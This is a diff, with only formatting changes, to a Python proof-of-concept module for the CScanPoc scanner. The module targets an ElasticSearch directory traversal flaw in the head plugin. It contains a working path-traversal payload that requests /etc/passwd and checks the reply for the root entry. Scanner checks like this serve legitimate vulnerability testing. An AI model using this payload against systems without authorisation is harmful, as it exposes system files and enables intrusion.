@@ -4,6 +4,7 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import json
 
+
 class Vuln(ABVuln):
     vuln_id = 'ElasticSearch_0003_p'  # 平台漏洞编号，留空
     name = 'ElasticSearch 目录穿越漏洞'  # 漏洞名称
@@ -30,12 +31,13 @@ class Poc(ABPoc):
 
     def verify(self):
         try:
-            #根据payload的不同，输出数据也会不同，所以后期再根据系统定制化参数的功能对payload做通用性处理
+            # 根据payload的不同，输出数据也会不同，所以后期再根据系统定制化参数的功能对payload做通用性处理
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             payload = '/_plugin/head/../../../../../../../../../etc/passwd'
-            r = requests.get('{target}{params}'.format(target=self.target, params=payload))
-            #print(r.text)
+            r = requests.get('{target}{params}'.format(
+                target=self.target, params=payload))
+            # print(r.text)
             if 'root:x:0:0:root:/root:/bin/bash' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -45,6 +47,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
